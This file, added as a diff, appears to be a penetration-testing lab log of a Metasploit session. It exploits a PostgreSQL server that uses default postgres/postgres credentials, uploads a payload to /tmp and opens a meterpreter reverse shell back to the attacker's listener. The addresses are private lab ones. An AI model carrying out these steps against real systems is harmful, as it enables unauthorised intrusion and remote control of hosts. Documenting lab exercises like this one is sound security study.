@@ -1,0 +1,40 @@
+msf6 exploit(linux/postgres/postgres_payload) > show options 
+
+Module options (exploit/linux/postgres/postgres_payload):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DATABASE  template1        yes       The database to authenticate against
+   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
+   RHOSTS    192.168.1.38     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT     5432             yes       The target port
+   USERNAME  postgres         yes       The username to authenticate as
+   VERBOSE   false            no        Enable verbose output
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.39     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+msf6 exploit(linux/postgres/postgres_payload) > exploit 
+
+[*] Started reverse TCP handler on 192.168.1.39:4444 
+[*] 192.168.1.38:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
+[*] Uploaded as /tmp/fBNsqPcO.so, should be cleaned up automatically
+[*] Sending stage (984904 bytes) to 192.168.1.38
+[*] Meterpreter session 4 opened (192.168.1.39:4444 -> 192.168.1.38:49607 ) at 2021-12-19 00:53:47 -0500
+
+meterpreter > ?
+
+
